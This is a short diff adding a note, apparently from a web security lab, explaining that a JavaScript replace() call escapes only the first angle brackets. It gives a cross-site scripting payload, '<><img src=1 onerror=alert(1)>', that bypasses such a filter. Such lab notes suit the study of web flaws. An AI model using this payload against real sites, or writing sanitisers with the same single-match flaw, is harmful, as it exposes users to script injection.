@@ -1,0 +1,4 @@
+replace() javascript function used only checking the first instance of angle brackets
+therefore can use:
+
+<><img src=1 onerror=alert(1)>
